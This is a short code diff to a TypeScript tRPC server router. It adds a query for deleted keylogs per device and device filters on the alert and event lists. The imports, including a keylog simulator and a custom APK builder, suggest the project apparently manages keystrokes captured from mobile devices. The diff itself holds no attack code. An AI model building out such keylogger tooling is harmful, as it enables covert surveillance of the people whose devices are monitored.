@@ -8,7 +8,7 @@ import { getSessionCookieOptions } from "./_core/cookies";
 import { COOKIE_NAME } from "../shared/const";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
-import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings } from "./db";
+import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
 import { buildCustomAPK } from "./apk-builder";
 
@@ -32,6 +32,11 @@ export const appRouter = router({
       .query(async ({ input }) => {
         return await getKeylogsByDevice(input.deviceId);
       }),
+    deleted: protectedProcedure
+      .input(z.object({ deviceId: z.string() }))
+      .query(async ({ input }) => {
+        return await getDeletedKeylogs(input.deviceId);
+      }),
     delete: protectedProcedure
       .input(z.object({ keylogId: z.number() }))
       .mutation(async ({ input }) => {
@@ -46,14 +51,16 @@ export const appRouter = router({
 
   alerts: router({
     list: protectedProcedure
-      .query(async () => {
+      .input(z.object({ deviceId: z.string().optional() }))
+      .query(async ({ input }) => {
         return await getAlerts();
       }),
   }),
 
   events: router({
     list: protectedProcedure
-      .query(async () => {
+      .input(z.object({ deviceId: z.string().optional() }))
+      .query(async ({ input }) => {
         return await getEvents();
       }),
   }),
